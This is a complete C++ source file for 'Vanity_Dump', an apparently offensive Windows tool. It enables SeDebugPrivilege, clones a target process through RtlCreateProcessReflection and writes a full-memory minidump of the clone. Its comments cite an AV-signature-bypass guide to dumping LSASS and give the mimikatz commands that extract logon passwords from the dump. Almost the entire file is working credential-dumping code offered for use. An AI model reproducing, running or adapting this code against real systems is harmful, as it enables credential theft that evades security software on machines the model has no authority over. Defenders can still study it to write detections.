
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <DbgHelp.h>
#include <processsnapshot.h>
#include <TlHelp32.h>
#include <processthreadsapi.h>
using namespace std;


//process reflection stuff copied from: https://github.com/hasherezade/pe-sieve/blob/master/utils/process_reflection.cpp
//minidump/process searching copied from: https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

//minidumpwritedump a RtlCreateProcessReflection copy of targeted process
//Usage: Vanity_Dump [target PID#] [output_file_path]
//if dumping LSASS, you can then use mimikatz: sekurlsa::minidump refl.dmp ; sekurlsa::logonpasswords

#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Advapi32.lib")

#define USE_RTL_PROCESS_REFLECTION

#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002
#endif

#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // don't update synchronization objects
#endif

#ifndef HPSS
#define HPSS HANDLE
#endif

const DWORD reflection_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE;

typedef HANDLE HPSS;

typedef struct {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} T_CLIENT_ID;

typedef struct
{
    HANDLE ReflectionProcessHandle;
    HANDLE ReflectionThreadHandle;
    T_CLIENT_ID ReflectionClientId;
} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;

// Win >= 7
NTSTATUS(NTAPI* _RtlCreateProcessReflection) (
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation
    ) = NULL;

// Win >= 8.1

bool load_RtlCreateProcessReflection()
{
    if (_RtlCreateProcessReflection == NULL) {
        HMODULE lib = LoadLibraryA("ntdll.dll");
        if (!lib) return false;

        FARPROC proc = GetProcAddress(lib, "RtlCreateProcessReflection");
        if (!proc) return false;

        _RtlCreateProcessReflection = (NTSTATUS(NTAPI*) (
            HANDLE,
            ULONG,
            PVOID,
            PVOID,
            HANDLE,
            T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION*
            )) proc;

    }
    if (_RtlCreateProcessReflection == NULL) return false;
    return true;
}

typedef struct {
    HANDLE orig_hndl;
    HANDLE returned_hndl;
    DWORD returned_pid;
    bool is_ok;
} t_refl_args;

DWORD WINAPI refl_creator(LPVOID lpParam)
{
    t_refl_args* args = static_cast<t_refl_args*>(lpParam);
    if (!args) {
        return !S_OK;
    }
    args->is_ok = false;

    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
    NTSTATUS ret = _RtlCreateProcessReflection(args->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &info);
    if (ret == S_OK) {
        args->is_ok = true;
        args->returned_hndl = info.ReflectionProcessHandle;
        args->returned_pid = (DWORD)info.ReflectionClientId.UniqueProcess;
    }
    else {
        printf("[-] Error: %d, Could not open target PID\n", GetLastError());
        exit(0);
    }
    return ret;
}

int main(int argc, char* argv[]) {
    
    printf("Vanity_Dump v1.0\n");
    printf("-----------------\n");
    
    if (argc != 3)
    {
        printf("Usage: %s [target PID#] [output_file_path]\n\n", argv[0]);

        return 1;
    }

    int TargetPID = atoi(argv[1]);

    try {
        HANDLE hToken;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
        TOKEN_PRIVILEGES tokenPriv;
        LUID luid;
        LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
        tokenPriv.PrivilegeCount = 1;
        tokenPriv.Privileges[0].Luid = luid;
        tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
    }
    catch (...) {
        printf("[-] Error: Could not set SeDebugPrivilege");
        exit(0);
    }

    const char* ofile = argv[2];

    t_refl_args args = { 0 };

    try {
        HANDLE TargetHandle = NULL;

        TargetHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, TargetPID);
        printf("[+] Target PID: %d\n", TargetPID);
        
        load_RtlCreateProcessReflection();
        //t_refl_args args = { 0 };
        args.orig_hndl = TargetHandle;
        
        try {
        DWORD ret = refl_creator(&args);
        }
        catch (...) {
            printf("[-] Error: Could not reflect target PID: %d\n", TargetPID);
            exit(0);
        }
        
        printf("[+] Dumping new reflected PID: %d\n", args.returned_pid);
        HANDLE outFile = CreateFileA(ofile, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        DWORD retd = MiniDumpWriteDump(args.returned_hndl, args.returned_pid, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

        printf("[+] Writing output to file: %s\n", argv[2]);

        CloseHandle(outFile);
        TerminateProcess(args.returned_hndl, 0);
        CloseHandle(args.returned_hndl);

        return 0;
    }
    catch (...) {
        printf("[-] Error: Could not dump reflected PID\n");
        
        //CloseHandle(outFile);
        TerminateProcess(args.returned_hndl, 0);
        CloseHandle(args.returned_hndl);

        exit(0);
    }
}